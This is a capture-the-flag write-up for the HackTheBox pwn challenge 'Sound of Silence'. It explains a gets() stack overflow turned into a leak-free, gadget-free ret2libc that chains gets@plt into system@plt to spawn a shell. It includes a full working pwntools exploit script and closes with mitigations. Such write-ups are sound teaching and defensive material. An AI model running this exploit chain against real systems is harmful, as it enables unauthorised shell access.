---
layout: post
title: "Sound of Silence"
date: 2028-04-19 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, ret2libc, buffer-overflow, rop, gets, no-pie, cwe-121]
description: "A modern No-PIE binary hands you gets() and system() but no gadgets, no /bin/sh string, and no leak. The trick: gets() leaves a register pointing at writable memory, so a two-slot ROP chain of gets->system pops a shell with zero gadgets."
---

## Overview

Sound of Silence is a Medium HackTheBox Pwn challenge built on a modern glibc 2.35 binary. It looks unsolvable by the usual playbook — there is no `/bin/sh` string, no `pop rdi` gadget, no `__libc_csu_init` for ret2csu, and no output function to leak libc. The path is a [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) turned into a leak-free, gadget-free `ret2libc` by riding a register the `gets()` call leaves pointing at writable memory.

## The technique

`main` does two things: prints a banner via `system("clear && echo ...")`, then reads input with `gets(buf)` into a 32-byte stack buffer. `gets` is unbounded, so we smash the saved return address. The offset is 32 (buffer) + 8 (saved `rbp`) = **40**.

```
checksec: No PIE (0x400000), No canary, NX, Full RELRO
imports:  gets@plt, system@plt
```

Everything the classic ret2libc relies on is missing:

- No `/bin/sh` string in the binary.
- No `pop rdi ; ret` gadget (modern GCC didn't emit one).
- glibc 2.35 removed `__libc_csu_init`, so no ret2csu.
- No `puts`/`printf` to leak libc for a real ret2libc.

The insight: **after `gets()` returns, `$rdi` still points at a writable address** and glibc does not clobber it before the next PLT call. So no gadget is needed at all — the ROP is two return slots. Return into `gets@plt` to read a *second* line into that writable address, then return into `system@plt`, which is called with the same `$rdi` — running the string we just typed.

## Solution

The overflow payload is 40 bytes of padding then the two PLT addresses. The second line we send, `sh #`, becomes `system("sh #")` — a shell, with `#` commenting out the trailing bytes `gets` appends.

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import ELF, p64, remote, process, context, sys
context.binary = elf = ELF('./sound_of_silence')

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process('./sound_of_silence')

io.send(b'A'*40 + p64(elf.plt['gets']) + p64(elf.plt['system']) + b'\n')
io.send(b'sh #\n')
io.interactive()
```

Run it against the instance and read the flag:

```bash
python3 solve.py <host> <port>
cat flag.txt   # HTB{...}
```

The flag value is redacted. The binary ships its own glibc via `RUNPATH ./glibc/`, so the local process uses the exact challenge libc — local behaviour matches remote.

## Why it worked

The binary handed over every piece: a stack overflow (`gets`), a static PLT (No-PIE), `system@plt` already imported for the banner, and a way to stage a command string in memory whose pointer survives in `$rdi`. Two PLT returns are the entire chain — no gadget hunting, no libc leak, no `/bin/sh` needed. Modern mitigations (NX, Full RELRO) are irrelevant because the exploit never executes stack data and never touches the GOT.

## Fix / defense

- Never use `gets()` — use `fgets(buf, sizeof(buf), stdin)`; the unbounded read is the root cause.
- Compile with `-fstack-protector-strong` (canary) and `-fPIE -pie` (ASLR randomises the PLT so `gets@plt`/`system@plt` aren't static).
- Don't import `system()` into a binary that also takes untrusted input; use `puts()` for a fixed banner instead.
